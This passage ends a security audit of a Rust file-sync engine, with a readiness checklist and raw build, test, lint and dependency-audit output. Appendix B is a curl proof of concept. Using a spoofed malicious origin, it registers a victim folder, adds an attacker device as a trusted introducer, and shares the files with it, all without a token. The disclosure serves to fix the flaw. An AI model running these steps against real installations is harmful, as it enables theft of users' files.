| **3 — Make it sync** | C2: dialer, index exchange, chunk pull via `SwarmScheduler`, throttle, relay fallback; two-node end-to-end tests | The core product promise |
| **4 — Make it shippable** | H1 signing, H2 CI and tests, H3 graceful shutdown, H4 watcher registry, H5 dependency upgrades, H7 build-from-source releases | Release engineering |
| **5 — Make it professional** | M1–M6 and section 8 | Polish, maintainability, store readiness |

---

## 10. Production-readiness checklist

**Security**
- [ ] API requires a token on every route, including the WebSocket
- [ ] CORS restricted or removed
- [ ] Device IDs validated; trust flags not settable without auth
- [ ] Mutual TLS with identity-bound certificates (QUIC + BEP)
- [ ] Chunk hashes validated (format and content)
- [ ] Introducer announcements only from authenticated introducers
- [ ] No shell-string interpolation anywhere
- [ ] `SECURITY.md` and threat model written

**Functionality**
- [ ] Outbound peer connections implemented
- [ ] Index exchange and chunk pull wired to `SwarmScheduler`
- [ ] Two-node end-to-end sync test passes in CI
- [ ] Watchers start/stop with folder add/pause/delete
- [ ] Graceful shutdown on API, JNI, SIGINT, SIGTERM

**Quality**
- [ ] `cargo fmt`, `clippy -D warnings`, `cargo test`, `cargo audit` in CI
- [ ] Gradle test tasks re-enabled; Kotlin tests exist and run
- [ ] No vulnerable dependencies
- [ ] Mock client moved out of `commonMain`

**Release**
- [ ] Android release keystore in CI secrets
- [ ] Windows/macOS code signing
- [ ] Engine built from source in CI; no committed binaries
- [ ] Single version source
- [ ] Changelog and checksums on releases

**Product**
- [ ] Syncthing naming removed (or compatibility made real)
- [ ] README rewritten for Synapse Core
- [ ] Privacy policy and Play declarations
- [ ] Localization and accessibility pass
- [ ] Repo cleaned of logs, zips, packages, and the oversized icon

---

## Appendix A — Raw tool results

### `cargo build`
```
Finished `dev` profile [unoptimized + debuginfo] target(s) in 1m 14s
(0 errors, 0 compiler warnings)
```

### `cargo test`
```
lib unit tests:     test result: ok. 144 passed; 0 failed; 0 ignored
integration_test:   test result: ok.   9 passed; 0 failed; 0 ignored
  test_cluster_pairing_and_devices_all ... ok
  test_conflict_endpoints_diff_and_resolution_actions ... ok
  test_mobile_pairing_event_and_acceptance_workflow ... ok
  test_state_machine_architecture_ux_dx_ax ... ok
  test_system_endpoints_all ... ok
  test_tier1_automated_3way_merge ... ok
  test_tier2_virtual_quarantine_zero_pollution ... ok
  test_websocket_realtime_event_streaming ... ok
  test_folder_lifecycle_controls_status_and_ignores ... ok
```

### `cargo clippy --all-targets` (grouped)
```
3  this expression creates a reference which is immediately dereferenced
2  used assert_eq! with a literal bool
2  this `if let` can be collapsed into the outer `if let`
2  consider using …
2  accessing first element with `.get(0)`        (engine/mod.rs:276, 341)
1  unnecessary use of … to create a slice
1  this function has too many arguments (9/7)
1  this function has too many arguments (8/7)
1  this `else { if .. }` can be collapsed
1  this `if` has identical blocks                  (conflict/diff3.rs:148)
1  this impl can be derived
1  the loop variable is used to index
1  the `Err`-variant returned is very large        (p2p/relay.rs:456)
1  manual absolute difference pattern
1  field assignment outside of initializer
1  calls to … immediately after creation
lib: 16 warnings; lib test: 22 (16 duplicates)
```

### `cargo fmt --check`
```
413 "Diff in" blocks
```

### `cargo audit` (project `Cargo.lock`, 263 crates)
```
Crate:     libsqlite3-sys
Version:   0.30.1
ID:        RUSTSEC-2026-0459
Solution:  Upgrade to >=0.39.0 (patched)

Crate:     chrono
Version:   0.4.45
ID:        RUSTSEC-2026-0543 (unmaintained)

error: 1 vulnerability found!
warning: 1 allowed warning found
```

### `unwrap()` / `expect()` outside test modules
```
src/storage/mod.rs    47
src/api/mod.rs         3
src/p2p/mod.rs         1
src/p2p/identity.rs    1
src/p2p/crypto.rs      1
src/engine/mod.rs      1
```

### Rust source size
```
storage/mod.rs 2024 · api/mod.rs 1315 · p2p/nat.rs 1325 · p2p/swarm.rs 1323 · p2p/relay.rs 1305
p2p/bep.rs 940 · engine/versioning.rs 912 · state/mod.rs 834 · p2p/throttle.rs 752
engine/fs_utils.rs 678 · p2p/mod.rs 615 · p2p/crypto.rs 610 · conflict/mod.rs 585
engine/mod.rs 491 · main.rs 369 · p2p/identity.rs 361 · lib.rs 277 · dag/mod.rs 274
conflict/diff3.rs 240 · engine/ignore.rs 196 · chunker/mod.rs 179
tests/integration_test.rs 1769
Total: 17,374 lines
```

---

## Appendix B — Exploit reproduction

Run this against a **throwaway** home directory only.

```bash
cd synapse-core && cargo build
export SYNAPSE_HOME=/tmp/syn_test
./target/debug/synapse-core --token SECRET123 -p 19090 \
    --p2p-port 19190 --bep-port 22999 --discovery-port 21999 &
sleep 3

B=http://127.0.0.1:19090
O="Origin: https://evil.example"     # simulate a request from a malicious web page
mkdir -p /tmp/victim_home_docs && echo private > /tmp/victim_home_docs/passwords.txt

# 0) CORS preflight is approved for any origin
curl -si -X OPTIONS -H "$O" -H "Access-Control-Request-Method: POST" \
     -H "Access-Control-Request-Headers: content-type" $B/api/v1/devices | grep -i access-control
#   access-control-allow-origin: *

# 1) Register an arbitrary directory as a sync folder (no token)
curl -s -o /dev/null -w "%{http_code}\n" -H "$O" -H "Content-Type: application/json" \
     -d '{"folder_id":"loot","local_path":"/tmp/victim_home_docs"}' $B/api/v1/folders
#   201

# 2) Add attacker device as trusted introducer (no token, no ID validation)
curl -s -o /dev/null -w "%{http_code}\n" -H "$O" -H "Content-Type: application/json" \
     -d '{"device_id":"AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA","name":"attacker","addresses":["tcp://203.0.113.5:22000"],"is_trusted":true,"introducer":true}' \
     $B/api/v1/devices
#   201

# 3) Share the folder with the attacker
curl -s -o /dev/null -w "%{http_code}\n" -H "$O" -X POST \
     "$B/api/v1/folders/loot/devices/AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA"
#   200

# 4) Confirm
curl -s $B/api/v1/folders/loot/devices
#   ["AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA"]

# 5) Shutdown endpoint also open (returns 200, though it's a no-op — see H3)
curl -s -o /dev/null -w "%{http_code}\n" -H "$O" -X POST $B/api/v1/system/shutdown
#   200
```

**Expected after the fix:** every request without a valid token returns `401`, and the preflight from `evil.example` gets no `access-control-allow-origin` header.

A browser can send all of these from any web page. Simple `POST` requests with `Content-Type: application/json` trigger a preflight, which the wildcard CORS approves.

---

## Appendix C — Not yet reviewed

These files couldn't be read in this pass and should be audited next. They're likely to have their own issues, such as where and how the API key is stored, and error and loading states.

- `core/src/commonMain/.../network/` — `SynapseCoreClient.kt`, `SyncthingApiClient.kt`, `HttpClientProvider.kt`, `MockSyncthingApiClient.kt`
- `core/src/{androidMain,jvmMain}/.../network/*ApiKeyProvider.kt` — **how the token is stored and read**
- `app/shared/src/commonMain/.../App.kt` and all `features/*` screens and ViewModels
- `app/shared/src/jvmMain/.../daemon/DesktopDaemonManager.kt` — how the desktop app launches and supervises the engine
- `app/androidApp/.../service/SyncthingService.kt`, `SyncthingRunnable.kt`, `RunConditionMonitor.kt`, `BootReceiver.kt`, `SynapseWidgetProvider.kt`, `MainActivity.kt`
- `app/desktopApp/.../main.kt`, `cli/LinuxHyprlandCli.kt`

To make them readable, free about 17 GB of disk space so the shell on the machine can start. Or connect the deep source folders (e.g. `app\shared\src\commonMain\kotlin\com\arcadelabs\synapse`) directly as additional folders.
